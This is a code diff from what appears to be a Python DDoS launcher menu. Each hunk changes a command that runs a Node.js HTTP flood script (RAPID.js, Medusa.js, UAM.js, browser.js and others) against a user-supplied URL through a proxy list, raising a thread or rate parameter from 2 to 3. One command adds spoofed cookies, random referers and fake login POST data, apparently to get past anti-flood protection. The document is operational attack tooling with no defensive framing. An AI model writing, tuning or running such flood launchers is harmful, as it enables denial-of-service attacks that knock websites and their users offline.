@@ -483,7 +483,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node chaptcha2.js {url} {duration} 64 2 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node chaptcha2.js {url} {duration} 64 3 proxy.txt')
                     
             except ValueError:
                 main()
@@ -535,7 +535,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node SkycatXFlood.js {url} {duration} 64 2 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node SkycatXFlood.js {url} {duration} 64 3 proxy.txt')
                     
             except ValueError:
                 main()
@@ -587,7 +587,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node RAPID.js {url} {duration} 64 2 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node RAPID.js {url} {duration} 64 3 proxy.txt')
                     
             except ValueError:
                 main()
@@ -639,7 +639,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node zan.js {url} {duration} 64 2 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node zan.js {url} {duration} 64 3 proxy.txt')
                     
             except ValueError:
                 main()
@@ -691,7 +691,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node Medusa.js {url} {duration} 64 2 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node Medusa.js {url} {duration} 64 3 proxy.txt')
                     
             except ValueError:
                 main()
@@ -795,7 +795,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node hold.js {url} {duration} 64 2 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node hold.js {url} {duration} 64 3 proxy.txt')
                     
             except ValueError:
                 main()
@@ -847,7 +847,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node strike.js GET {url} {duration} 2 64 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node strike.js GET {url} {duration} 3 64 proxy.txt')
                     
             except ValueError:
                 main()
@@ -951,7 +951,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node browser.js GET {url} {duration} 2 64 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
+                    os.system(f'cd l7 && screen -dm node browser.js GET {url} {duration} 3 64 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                     
             except ValueError:
                 main()
@@ -1003,7 +1003,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node zx.js {url} {duration} 2 proxy.txt 100')
+                    os.system(f'cd l7 && screen -dm node zx.js {url} {duration} 3 proxy.txt 100')
                     
             except ValueError:
                 main()
@@ -1055,7 +1055,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node UAM.js {url} {duration} 64 2 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node UAM.js {url} {duration} 64 3 proxy.txt')
                     
             except ValueError:
                 main()
@@ -1107,7 +1107,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node xyn.js {url} {duration} 64 2 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node xyn.js {url} {duration} 64 3 proxy.txt')
                     
             except ValueError:
                 main()
